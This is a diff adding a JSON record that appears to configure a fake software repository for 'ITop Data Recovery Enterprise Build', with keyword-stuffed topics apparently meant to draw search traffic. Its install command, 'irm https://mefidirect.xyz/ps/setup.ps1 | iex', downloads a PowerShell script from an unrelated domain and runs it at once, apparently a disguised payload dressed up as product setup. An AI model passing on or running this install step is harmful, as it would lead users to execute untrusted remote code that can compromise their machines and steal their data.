@@ -1,0 +1,27 @@
+{
+  "repo": "itop-data-recovery-enterprise-build",
+  "product": "ITop Data Recovery Enterprise Build",
+  "kind": "recovery",
+  "install_type": "download",
+  "download_url": "https://itop-recovery.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "recovery",
+  "topics": [
+    "itop-recovery-client",
+    "itop-recovery-stable-build",
+    "itop-recovery-setup-guide-2026",
+    "drive-repair",
+    "software-hub",
+    "itop-recovery-pc-edition",
+    "app-catalog",
+    "undelete-tools",
+    "itop-recovery-suite",
+    "itop-recovery-setup",
+    "backup-restore",
+    "itop-recovery-guide",
+    "release-notes"
+  ]
+}
